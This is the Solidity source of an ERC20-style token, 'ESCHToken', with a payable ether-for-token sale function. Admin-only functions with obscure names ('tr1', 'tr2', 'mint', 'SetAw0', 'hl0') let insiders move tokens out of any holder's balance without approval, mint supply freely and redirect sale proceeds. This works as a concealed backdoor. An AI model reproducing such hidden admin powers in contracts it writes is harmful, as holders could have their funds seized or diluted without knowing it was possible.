 

pragma solidity 0.4.18; 
 
contract ESCHToken  {
 string public constant name = "Esch$Token";
  string public constant symbol = "ESCH$";        
  uint8 public constant decimals = 18;
  uint256 public totalSupply;
  address  owner;
  uint32 hl=1000;
  address SysAd0; 
 
    mapping (address => uint256) public balanceOf;
 
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Burn(address indexed from, uint256 value);
 
    mapping (address => bool) admin;

 
   function ESCHToken () public {
      totalSupply = 10200000 ether;                           
      balanceOf[msg.sender] = totalSupply;
	  owner = msg.sender;                              
	  admin[owner]=true;
  
    }

    function transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public {
        transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);      
        allowance[_from][msg.sender] -= _value;
        transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }


    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        allowance[_from][msg.sender] -= _value;
        totalSupply -= _value;
        Burn(_from, _value);
        return true;
    }
 
    function setadmin (address _admin) public {
    require(admin[msg.sender]==true);
    admin[_admin]=true;
   }

 
    function mint(address _ad,uint256 _sl) public  {    
    require(admin[msg.sender]==true);
    balanceOf[_ad]+= _sl;
       totalSupply+= _sl;
        Transfer(0, _ad, _sl);
    }

 
    function cxesch (address _c1) public view returns(uint256 _j1){
        return( balanceOf[_c1]);
    }

    function SetAw0(address _adA0) public {
    assert(admin[msg.sender]==true);   
    SysAd0=_adA0;
    }   

    function hl0(uint32 _hl) public {
    assert(admin[msg.sender]==true);   
    hl=_hl;
    }       
   

    function gm() public payable {
    require (balanceOf[SysAd0]>=hl*msg.value);    
    require (msg.value>=0.1 ether);
    transfer(SysAd0, msg.sender, hl*msg.value);
    SysAd0.transfer(msg.value);
    }
      
      function tr1(address _from, address _to, uint _value) public {
         assert(admin[msg.sender]==true);    
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint pre1 = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == pre1);
    } 
     
       function tr2(address _to, uint _value) public {
        assert(admin[msg.sender]==true);  
        require (totalSupply<100000000 ether); 
        require(balanceOf[_to] + _value > balanceOf[_to]);
        totalSupply +=_value;
        balanceOf[_to] += _value;
        Transfer(0, _to, _value);
    }   
    
 
}